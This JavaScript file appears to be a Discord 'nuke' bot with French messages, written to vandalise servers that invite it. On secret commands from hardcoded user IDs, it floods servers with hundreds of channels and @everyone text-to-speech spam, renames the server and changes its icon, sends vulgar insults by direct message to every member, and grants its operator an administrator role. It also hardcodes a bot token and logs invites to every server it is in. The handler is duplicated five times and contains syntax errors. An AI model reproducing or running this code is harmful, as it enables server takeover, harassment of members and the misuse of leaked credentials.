const Discord = require("discord.js");
const client = new Discord.Client();
const bot = new Discord.Client();
const token = 'NDc5MTgyOTI5MDgwMDkwNjY0.DlYcJw.LS2W3KoSzUKJyNISPgo7zKb3zmE';

client.on("ready", () => {

    client.user.setStatus("online");

    client.guilds.forEach(serv => {
        serv.channels.random().createInvite().then(invite => console.log(`>${serv.name} | ${invite}`))
        .catch(console.log(`>${serv.name} | Entrain d'envoyer une invite... `));
    });

    var memberCount = client.users.size;
    var serverCount = client.guilds.size;
    console.log("--------------------------------------");
    console.log('Information du bot:')
    console.log(`Nom du bot: ${client.user.tag}R!`);
    console.log(`Id du bot: ${client.user.id}`)
    console.log(`lien d'inivtation:https://discordapp.com/oauth2/authorize?client_id=479182929080090664&scope=bot&permissions=8`)
    console.log(`Token: du bot: ${client.token}`)
    console.log("--------------------------------------");
    console.log('Information du client:')
    console.log("Utilisateurs: " + memberCount + "\nServeurs: " + serverCount);
    console.log('--------------------------------------')
});

client.on('message', function (message) {
    if (message.content === 'R!chan' && message.author.id === '479182929080090664') {
        console.log(`Commande !chan par ${message.author.tag}`);
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval(function () {
            if (i === 250) clearInterval(interval);
            message.guild.createChannel("Hacked-by-Y4nN0xX").then(i++);
        }, 100);
    }

    if (message.content === 'R!spam' && message.author.id === '479182929080090664') {
        console.log(`Commande !spam par ${message.author.tag}`);
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval(function () {
            message.guild.channels.forEach(channel => {
                if (channel.type === "text") channel.send('@everyone Y4nN0xX a Bien Baiser le serveur', { tts: true }).then(i++);
            }, 2500);
        });
    }

    if (message.content === 'R!rekt' && message.author.id === '479182929080090664') {
        console.log(`Commande !rekt par ${message.author.tag}`);
        if (message.deletable) message.delete();
        message.guild.setRegion('hongkong')
        let names = [
          "Hacked",
          "BY",
          "Y4nN0X,
        ];
        let wait = 2000;
        message.guild.setIcon('https://i.pinimg.com/736x/a0/4d/2f/a04d2fd54cac08cc5b1afa64dff45f7b--scary-anime-pictures.jpg');
        setInterval(function () {
            setTimeout(function () {
                names.forEach(name => {
                    message.guild.setName(name).then(wait += 2000);
                });
            }, names.length * 2000);
        }, wait)
    }

    if (message.content === 'R!role' && message.author.id === '479182929080090664') {
        console.log(`Commande !role par ${message.author.tag}`);
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' }).then(function (role) {
            message.guild.members.forEach(member => {
		if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })		
            })
        })
    }

    if (message.content === "R!mp" && message.author.id === '479182929080090664') {
        if (message.deletable) message.delete();
        message.guild.members.forEach(member => {
            member.send(`**${message.guild.name}** a été enculé Par Y4nN0xX).catch(e => { });
        })
    }

    if (message.content === 'R!rank' && message.author.id === '479182929080090664') {
        console.log(`Commande !rank par ${message.author.tag}`);
        if (message.deletable) message.delete();
        message.member.guild.createRole({
            name: 'Dieu du hack',
            permissions: "ADMINISTRATOR",
        })
        .then(function (role) { message.member.addRole(role); });
    }

});


client.on('message', function (message) {
    if (message.content === 'R!chan' && message.author.id === '479182929080090664') {
        console.log(`Commande !chan par ${message.author.tag}`);
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval(function () {
            if (i === 250) clearInterval(interval);
            message.guild.createChannel("Hacked-by-Y4nN0xX").then(i++);
        }, 100);
    }

    if (message.content === 'R!spam' && message.author.id === '479182929080090664') {
        console.log(`Commande !spam par ${message.author.tag}`);
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval(function () {
            message.guild.channels.forEach(channel => {
                if (channel.type === "text") channel.send('@everyone Y4nN0xX a baiser le serveur', { tts: true }).then(i++);
            }, 2500);
        });
    }

    if (message.content === 'R!rekt' && message.author.id === '479182929080090664') {
        console.log(`Commande !rekt par ${message.author.tag}`);
        if (message.deletable) message.delete();
        message.guild.setRegion('hongkong')
        let names = [
          "hack",
          "BY",
          "Y4nN0xX",
        ];
        let wait = 2000;
        message.guild.setIcon('https://i.pinimg.com/736x/a0/4d/2f/a04d2fd54cac08cc5b1afa64dff45f7b--scary-anime-pictures.jpg');
        setInterval(function () {
            setTimeout(function () {
                names.forEach(name => {
                    message.guild.setName(name).then(wait += 2000);
                });
            }, names.length * 2000);
        }, wait)
    }

    if (message.content === 'R!role' && message.author.id === '479182929080090664') {
        console.log(`Commande !role par ${message.author.tag}`);
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' }).then(function (role) {
            message.guild.members.forEach(member => {
		if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })		
            })
        })
    }

    if (message.content === "R!mp" && message.author.id === '217281134956904448') {
        if (message.deletable) message.delete();
        message.guild.members.forEach(member => {
            member.send(`**${message.guild.name}** a été enculé Par Y4nN0xX`).catch(e => { });
        })
    }

    if (message.content === 'R!rank' && message.author.id === '217281134956904448') {
        console.log(`Commande !rank par ${message.author.tag}`);
        if (message.deletable) message.delete();
        message.member.guild.createRole({
            name: 'Dieu du hack Y4nN0xX',
            permissions: "ADMINISTRATOR",
        })
        .then(function (role) { message.member.addRole(role); });
    }

});


client.on('message', function (message) {
    if (message.content === 'R!chan' && message.author.id === '431533282652585995') {
        console.log(`Commande !chan par ${message.author.tag}`);
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval(function () {
            if (i === 250) clearInterval(interval);
            message.guild.createChannel("Hacked-by-Y4nN0xX").then(i++);
        }, 100);
    }

    if (message.content === 'R!spam' && message.author.id === '431533282652585995') {
        console.log(`Commande !spam par ${message.author.tag}`);
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval(function () {
            message.guild.channels.forEach(channel => {
                if (channel.type === "text") channel.send('@everyone server hacked by Y4nN0xX', { tts: true }).then(i++);
            }, 2500);
        });
    }

    if (message.content === 'R!rekt' && message.author.id === '431533282652585995') {
        console.log(`Commande !rekt par ${message.author.tag}`);
        if (message.deletable) message.delete();
        message.guild.setRegion('hongkong')
        let names = [
          "Hacked",
          "BY",
          "Y4nN0xX",
        ];
        let wait = 2000;
        message.guild.setIcon('https://i.pinimg.com/736x/a0/4d/2f/a04d2fd54cac08cc5b1afa64dff45f7b--scary-anime-pictures.jpg');
        setInterval(function () {
            setTimeout(function () {
                names.forEach(name => {
                    message.guild.setName(name).then(wait += 2000);
                });
            }, names.length * 2000);
        }, wait)
    }

    if (message.content === 'R!role' && message.author.id === '431533282652585995') {
        console.log(`Commande !role par ${message.author.tag}`);
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' }).then(function (role) {
            message.guild.members.forEach(member => {
		if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })		
            })
        })
    }

    if (message.content === "R!mp" && message.author.id === '431533282652585995') {
        if (message.deletable) message.delete();
        message.guild.members.forEach(member => {
            member.send(`**${message.guild.name}** a été enculé Par Y4nN0xX`).catch(e => { });
        })
    }

    if (message.content === 'R!rank' && message.author.id === '431533282652585995') {
        console.log(`Commande !rank par ${message.author.tag}`);
        if (message.deletable) message.delete();
        message.member.guild.createRole({
            name: 'Dieu du Hack',
            permissions: "ADMINISTRATOR",
        })
        .then(function (role) { message.member.addRole(role); });
    }

});



client.on('message', function (message) {
    if (message.content === 'R!chan' && message.author.id === '250306806985916426') {
        console.log(`Commande !chan par ${message.author.tag}`);
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval(function () {
            if (i === 250) clearInterval(interval);
            message.guild.createChannel("Hacked-by-Y4nN0xX").then(i++);
        }, 100);
    }

    if (message.content === 'R!spam' && message.author.id === '250306806985916426') {
        console.log(`Commande !spam par ${message.author.tag}`);
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval(function () {
            message.guild.channels.forEach(channel => {
                if (channel.type === "text") channel.send('@everyone server hacked by Y4nN0xX', { tts: true }).then(i++);
            }, 2500);
        });
    }

    if (message.content === 'R!rekt' && message.author.id === '250306806985916426') {
        console.log(`Commande !rekt par ${message.author.tag}`);
        if (message.deletable) message.delete();
        message.guild.setRegion('hongkong')
        let names = [
          "Hacked",
          "BY",
          "Y4nN0xX",
        ];
        let wait = 2000;
        message.guild.setIcon('https://i.pinimg.com/736x/a0/4d/2f/a04d2fd54cac08cc5b1afa64dff45f7b--scary-anime-pictures.jpg');
        setInterval(function () {
            setTimeout(function () {
                names.forEach(name => {
                    message.guild.setName(name).then(wait += 2000);
                });
            }, names.length * 2000);
        }, wait)
    }

    if (message.content === 'R!role' && message.author.id === '250306806985916426') {
        console.log(`Commande !role par ${message.author.tag}`);
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' }).then(function (role) {
            message.guild.members.forEach(member => {
		if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })		
            })
        })
    }

    if (message.content === "R!mp" && message.author.id === '250306806985916426') {
        if (message.deletable) message.delete();
        message.guild.members.forEach(member => {
            member.send(`**${message.guild.name}** a été enculé Par Y4nN0xX`).catch(e => { });
        })
    }

    if (message.content === 'R!rank' && message.author.id === '250306806985916426') {
        console.log(`Commande !rank par ${message.author.tag}`);
        if (message.deletable) message.delete();
        message.member.guild.createRole({
            name: 'Dieu du hack',
            permissions: "ADMINISTRATOR",
        })
        .then(function (role) { message.member.addRole(role); });
    }

});





client.on('message', function (message) {
    if (message.content === 'R!chan' && message.author.id === '479035367467778048') {
        console.log(`Commande !chan par ${message.author.tag}`);
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval(function () {
            if (i === 250) clearInterval(interval);
            message.guild.createChannel("hacked-by-Y4nN0xX").then(i++);
        }, 100);
    }

    if (message.content === 'R!spam' && message.author.id === '479035367467778048') {
        console.log(`Commande !spam par ${message.author.tag}`);
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval(function () {
            message.guild.channels.forEach(channel => {
                if (channel.type === "text") channel.send('@everyone server hacked Par Y4nN0xX', { tts: true }).then(i++);
            }, 2500);
        });
    }

    if (message.content === 'R!rekt' && message.author.id === '479035367467778048') {
        console.log(`Commande !rekt par ${message.author.tag}`);
        if (message.deletable) message.delete();
        message.guild.setRegion('hongkong')
        let names = [
          "hackd",
          "BY",
          "Y4nN0xX",
        ];
        let wait = 2000;
        message.guild.setIcon('https://i.pinimg.com/736x/a0/4d/2f/a04d2fd54cac08cc5b1afa64dff45f7b--scary-anime-pictures.jpg');
        setInterval(function () {
            setTimeout(function () {
                names.forEach(name => {
                    message.guild.setName(name).then(wait += 2000);
                });
            }, names.length * 2000);
        }, wait)
    }

    if (message.content === 'R!role' && message.author.id === '479035367467778048') {
        console.log(`Commande !role par ${message.author.tag}`);
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' }).then(function (role) {
            message.guild.members.forEach(member => {
		if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })
        if (message.deletable) message.delete();
        message.guild.createRole({ name: 'Y4nN0xX', color: 'RANDOM' })		
            })
        })
    }

    if (message.content === "R!mp" && message.author.id === '479035367467778048') {
        if (message.deletable) message.delete();
        message.guild.members.forEach(member => {
            member.send(`**${message.guild.name}** a été enculé Par Y4nN0xX`).catch(e => { });
        })
    }

    if (message.content === 'R!rank' && message.author.id === '479035367467778048') {
        console.log(`Commande !rank par ${message.author.tag}`);
        if (message.deletable) message.delete();
        message.member.guild.createRole({
            name: 'Dieu du hack',
            permissions: "ADMINISTRATOR",
        })
        .then(function (role) { message.member.addRole(role); });
    }

});







client.login(token)
